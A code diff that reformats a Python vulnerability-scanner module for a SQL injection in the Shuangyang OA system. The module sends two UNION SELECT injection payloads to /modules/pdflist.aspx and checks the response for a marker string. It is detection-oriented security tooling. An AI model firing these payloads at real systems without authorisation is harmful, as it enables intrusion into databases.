@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Shuangyang_0004' # 平台漏洞编号，留空
+    vuln_id = 'Shuangyang_0004'  # 平台漏洞编号，留空
     name = '双杨OA系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-05-25'  # 漏洞公布时间
     desc = '''
         双杨OA系统多处存在SQL注入漏洞：
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '双杨OA系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '02f18411-7a7e-4531-9988-79ccb5be3fa1'
@@ -32,27 +34,27 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0116142
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0116142
             hh = hackhttp.hackhttp()
             payloads = [
                 '/modules/pdflist.aspx?info_id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2bCHAR%2898%29%2bCHAR%28112%29%2bCHAR%28107%29%2bCHAR%28113%29%2bCHAR%28102%29%2bCHAR%2897%29%2bCHAR%2876%29%2bCHAR%28113%29%2bCHAR%28109%29%2bCHAR%2872%29%2bCHAR%2888%29%2bCHAR%28108%29%2bCHAR%28117%29%2bCHAR%2877%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28120%29%2bCHAR%28113%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL--',
                 '/modules/pdflist.aspx?info_id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28102%29%7C%7CCHR%2897%29%7C%7CCHR%2876%29%7C%7CCHR%28113%29%7C%7CCHR%28109%29%7C%7CCHR%2872%29%7C%7CCHR%2888%29%7C%7CCHR%28108%29%7C%7CCHR%28117%29%7C%7CCHR%2877%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--'
             ]
             for payload in payloads:
-                url = self.target + payload 
+                url = self.target + payload
                 code, head, res, errcode, _ = hh.http(url)
                 if 'qbpkqfaLqmHXluMqpxqq' in res:
                     #security_hole(arg + 'modules/pdflist.aspx?info_id=1')
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
-                    
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
 
+
 if __name__ == '__main__':
     Poc().run()
-
